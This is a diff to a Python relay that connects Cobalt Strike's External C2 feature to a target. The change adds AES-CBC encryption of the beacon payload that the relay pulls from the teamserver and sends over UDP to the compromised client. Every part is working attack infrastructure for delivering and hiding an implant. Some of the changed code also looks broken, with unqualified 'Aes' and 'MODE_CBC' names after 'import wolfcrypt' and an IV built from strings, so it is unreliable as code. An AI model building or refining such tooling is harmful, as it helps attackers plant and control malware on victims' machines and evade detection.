@@ -11,13 +11,14 @@ import struct
 import sys
 import time
 import select
+import wolfcrypt
 
 
 class SocketInfo:
     """
     @brief Class to hold info for TCP session
     """
-    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, timeout, retries):
+    def __init__(self, ts_ip, ts_port, srv_ip, srv_port, pipe_str, timeout, retries, key):
         """
 
         :param ts_ip: IP address of CS Teamserver
@@ -37,6 +38,7 @@ class SocketInfo:
         self.pipe_str = pipe_str
         self.timeout = timeout
         self.retries = retries
+        self.key = key
 
 
 class ExternalC2Controller:
@@ -294,6 +296,11 @@ class ExternalC2Controller:
         # Receive the beacon payload from CS to forward to our target
         payload = self.recv_from_ts()
 
+        iv = ''.join([chr(random.randint(0, 0xFF)) for i in range(16)])
+        print("IV : {}".format(iv))
+        cipher = Aes(bytes(socketInfo.key), MODE_CBC, iv)
+        encrypted_payload = iv + cipher.encrypt(payload)
+
         # Now that we have our beacon to send, wait for a connection from our target
         self._socketServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         self._socketServer.bind((socketInfo.srv_ip,socketInfo.srv_port))
@@ -346,10 +353,10 @@ class ExternalC2Controller:
             if (not connected):
                 print("Failed 3-way handshake from {}".format(clientAddr))
 
-        print("Handshake completed. Sending payload size {} to client.".format(len(payload)))  
+        print("Handshake completed. Sending payload size {} to client.".format(len(encrypted_payload)))  
 
         # Send beacon payload to target
-        self.sendToBeacon(payload)
+        self.sendToBeacon(encrypted_payload)
 
         #Wait for payload
         time.sleep(1)
@@ -373,7 +380,7 @@ class ExternalC2Controller:
 
 parser = argparse.ArgumentParser(description='Program to provide TCP communications for Cobalt Strike using the External C2 feature.',
                                  usage="\n"
-                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR] [TIMEOUT] [RETRIES]"
+                                       "%(prog)s [TS_IP] [SRV_IP] [SRV_PORT] [PIPE_STR] [TIMEOUT] [RETRIES] [KEY]"
                                        "\nUse '%(prog)s -h' for more information.")
 parser.add_argument('ts_ip', help="IP of teamserver (or redirector).")
 parser.add_argument('srv_ip', help="IP to bind to on server.")
@@ -381,12 +388,13 @@ parser.add_argument('srv_port', type=int, help="Port number to bind to on server
 parser.add_argument('pipe_str', help="String to name the pipe to the beacon. It must be the same as the client.")
 parser.add_argument('timeout', type=int, help="The socket timeout option (in seconds) set by settimeout()")
 parser.add_argument('retries', type=int, help="Number of times to retry listening for a connection after a timeout occurs.")
+parser.add_argument('key', help="AES key to encrypt the beacon that is initially sent.")
 parser.add_argument('--teamserver_port', '-tp', default=2222, type=int, help="Customize the port used to connect to the teamserver. Default is 2222.")
 parser.add_argument('--restart', '-r', default="N", help="Sleep 10s then restart the server after a disconnect or exit (Y/N). Default is N.")
 parser.add_argument('--arch', '-a', choices=['x86', 'x64'], default='x86', type=str, help="Architecture to use for beacon. x86 or x64. Default is x86.")
 args = parser.parse_args()
 controller = ExternalC2Controller(args.teamserver_port)
-socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.timeout, args.retries)
+socketInfo = SocketInfo(args.ts_ip, args.teamserver_port, args.srv_ip, args.srv_port, args.pipe_str, args.timeout, args.retries, args.key)
 while True:
     if(args.arch == 'x64'):
         print('Ensure client is x64!')
